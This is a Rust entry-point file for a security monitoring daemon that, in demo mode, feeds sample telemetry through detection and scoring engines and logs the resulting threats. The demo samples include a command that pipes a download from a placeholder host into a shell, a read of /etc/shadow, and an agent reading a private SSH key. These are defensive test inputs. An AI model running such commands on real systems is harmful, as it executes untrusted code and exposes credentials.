//! AETHER SENTINEL — zero-trust security intelligence daemon (MVP runtime).
//!
//! Feeds a few built-in demo telemetry samples through the detection and
//! scoring engines and prints the resulting findings + correlated threats.
//! In production this loops, pulling from the AETHER event bus.

use anyhow::Result;
use clap::Parser;
use tracing::{info, warn};
use tracing_subscriber::EnvFilter;

use aether_sentinel::detect::Detector;
use aether_sentinel::scoring;
use aether_sentinel::types::*;

#[derive(Parser)]
#[command(name = "aether-sentinel", version, about = "AETHER SENTINEL — zero-trust security intelligence")]
struct Cli {
    /// Log level (error|warn|info|debug|trace).
    #[arg(long, default_value = "info")]
    log_level: String,

    /// Inject built-in demo telemetry to exercise the engine.
    #[arg(long, default_value_t = false)]
    demo: bool,

    /// Seconds between self-scans (0 = scan once and exit).
    #[arg(long, default_value_t = 30)]
    interval: u64,
}

fn demo_samples() -> Vec<TelemetrySample> {
    vec![
        TelemetrySample::new(
            TelemetrySource::Process,
            serde_json::json!({ "cmd": "curl https://example.test | sh" }),
        ),
        TelemetrySample::new(
            TelemetrySource::Filesystem,
            serde_json::json!({ "path": "/etc/shadow", "op": "read" }),
        ),
        TelemetrySample::for_agent(
            TelemetrySource::Agent,
            "scout-01",
            serde_json::json!({ "action": "read_file", "target": "/home/user/.ssh/id_rsa" }),
        ),
    ]
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::new(format!("aether_sentinel={}", cli.log_level)))
        .init();

    info!("AETHER SENTINEL starting");

    let mut detector = Detector::new();
    let mut all: Vec<Finding> = Vec::new();

    if cli.demo {
        for s in demo_samples() {
            let fs = detector.scan(&s);
            for f in &fs {
                info!(lane = %f.lane.as_str(), rule = %f.rule, "finding: {}", f.detail);
            }
            all.extend(fs);
        }
    }

    let threats = scoring::correlate(&all);
    for t in &threats {
        warn!(
            risk = %t.score.risk,
            priority = %t.score.priority.as_str(),
            "THREAT: {}",
            t.title
        );
    }
    info!(findings = all.len(), threats = threats.len(), "scan complete");

    if cli.interval == 0 {
        return Ok(());
    }

    let mut tick = tokio::time::interval(std::time::Duration::from_secs(cli.interval));
    loop {
        tick.tick().await;
        // Production: pull from AETHER event bus and re-scan.
        info!("heartbeat");
    }
}
